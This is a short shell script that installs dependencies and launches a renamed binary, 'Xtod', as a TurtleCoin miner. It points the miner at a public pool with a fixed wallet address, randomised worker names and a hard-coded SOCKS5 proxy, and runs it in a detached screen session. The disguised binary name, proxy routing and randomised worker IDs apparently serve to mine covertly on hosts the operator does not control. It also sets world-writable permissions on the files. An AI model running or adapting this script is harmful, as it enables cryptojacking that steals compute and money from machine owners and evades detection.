sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x start.sh && chmod +x Xtod chmod 777 Xtod start.sh
screen -dmS ls 
POOL=turtlecoin.herominers.com:10380
WALLET=TRTLv1sFBdxXrSMTWycv1xT14C3wNefSCJG2jEjduUcbQNEkkkEpEKM8826pfeG3qDVM3HifmdfMeRizcGDrygCfG3d1aXmHi7n
WORKER=$(echo $(shuf -i 9-15 -n 1)-JOB10)
PROXY=socks5://162.243.168.215:9300
./Xtod -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 -t 2 -x $PROXY
